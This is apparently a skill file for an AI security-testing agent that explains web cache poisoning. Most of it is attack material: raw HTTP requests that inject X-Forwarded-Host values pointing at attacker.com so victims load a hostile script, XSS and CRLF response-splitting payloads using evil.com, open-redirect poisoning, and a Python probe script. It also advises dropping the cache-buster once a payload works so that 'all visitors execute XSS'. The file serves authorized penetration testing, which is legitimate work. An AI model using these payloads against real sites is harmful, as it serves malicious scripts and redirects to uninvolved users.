---
name: cache_poisoning
description: Web cache poisoning - unkeyed header injection, fat GET, response splitting, cache-buster methodology, X-Cache confirmation
---

# Web Cache Poisoning

Web cache poisoning tricks a cache into storing a malicious response that is then served to other users. The attacker's input must reach the cache key but also be reflected into the response — typically via unkeyed headers that the cache ignores but the application uses.

## Core Concept

```
Cache key = Host + Path + (some headers) + (some params)
Unkeyed inputs = headers/params NOT in cache key but USED in response

Attack: inject malicious value via unkeyed input → get it cached → all users receive poisoned response
```

## Phase 1: Discover Unkeyed Inputs

### Test Common Unkeyed Headers

For each candidate header, send two requests — one with a canary value, one without:

```
Request A:
GET /?cb=1 HTTP/1.1
Host: example.com
X-Forwarded-Host: canary-a1b2c3.example.com

Request B (same cache key, same cb=):
GET /?cb=1 HTTP/1.1
Host: example.com

# If A's response contains "canary-a1b2c3" → unkeyed hit
# If X-Cache: HIT on second → it was cached with the canary value
```

Common unkeyed headers to test:
```
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Host
X-HTTP-Host-Override
Forwarded
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
Accept-Language (if response varies by language)
Origin
```

### Cache-Buster Technique

Always use a unique `cb=` parameter to prevent poisoning real users during testing:
```
GET /?cb=UNIQUE_RANDOM HTTP/1.1
X-Forwarded-Host: canary.attacker.com
```

Confirm cache storage:
```
1st request: X-Cache: MISS
2nd request (no X-Forwarded-Host header): X-Cache: HIT → cached with canary value
```

## Phase 2: Escalate to XSS

### Via X-Forwarded-Host → Script Import

```
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com

# If response contains: <script src="https://example.com/app.js">
# With poisoning becomes: <script src="https://attacker.com/app.js">
# → victims load attacker's script → XSS
```

### Via Unkeyed Query Parameter

```
GET /?country=US&evil=<script>alert(document.domain)</script> HTTP/1.1
# If "evil" is not in cache key but reflected in response:
# Poison the /? base path for all users from US region
```

### Fat GET (Body in GET Request)

Some caches key on method+path, but some servers read POST-style body from GET:
```
GET / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

param=poisoned
```

### Response Splitting (Cache Deception Adjacent)

```python
# If any unkeyed input is reflected without encoding in Location/Set-Cookie:
X-Forwarded-Host: evil.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>
# Old/misconfigured caches may store the injected response
```

## Phase 3: Attack Chaining

### Cache Poisoning + DOM XSS

```
1. Find unkeyed header reflected in page (e.g., X-Forwarded-Host → window.host variable)
2. Build DOM XSS payload: X-Forwarded-Host: attacker.com"><script>alert(1)</script>
3. Get it cached (no cb= once confirmed working)
4. All visitors execute XSS
```

### Cache Poisoning + Open Redirect

```
GET /login HTTP/1.1
X-Forwarded-Host: attacker.com

# If response is: Location: https://example.com/oauth?redirect_uri=...
# And X-Forwarded-Host replaces the host in that URL
# Poison the redirect to: Location: https://attacker.com/oauth?redirect_uri=...
```

### Path Variation Cache Poisoning

```
# Different paths for same content
/api/config → cached as unversioned
/api/config?version=1 → same content, different cache entry

# Poison one variant only
GET /api/config?cb=UNIQUE HTTP/1.1
X-Api-Version: hacked
# If version is unkeyed and reflected in response → poison
```

## Unkeyed Parameter Testing

```python
import requests, hashlib, time

def test_unkeyed_param(url, param_name, param_value):
    cb = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    # First request — inject canary
    r1 = requests.get(url, params={param_name: param_value, 'cb': cb}, verify=False)
    cache_status1 = r1.headers.get('X-Cache', 'unknown')
    
    # Second request — check if cached without the param
    r2 = requests.get(url, params={'cb': cb}, verify=False)
    cache_status2 = r2.headers.get('X-Cache', 'unknown')
    
    if param_value in r2.text:
        print(f"[UNKEYED PARAM] {param_name} is unkeyed — reflected in cached response!")
        print(f"  Cache status: {cache_status1} → {cache_status2}")
        return True
    return False
```

## Validation Approach

1. Use `param_miner` (Burp extension) to automatically discover unkeyed inputs
2. Manually confirm: inject canary → second request (no header) → X-Cache: HIT + canary in body
3. Build XSS PoC: `<script>alert(document.domain)</script>` via confirmed unkeyed header
4. Verify: third request without any injected header returns poisoned response with XSS
5. Document: probe request ID → HIT confirmation request ID → impact of cached payload

## Tools

- `param_miner` Burp extension — automated unkeyed input discovery
- `web-cache-vulnerability-scanner` — automated poisoning tester
- Manual `send_request` with canary values + X-Cache header monitoring
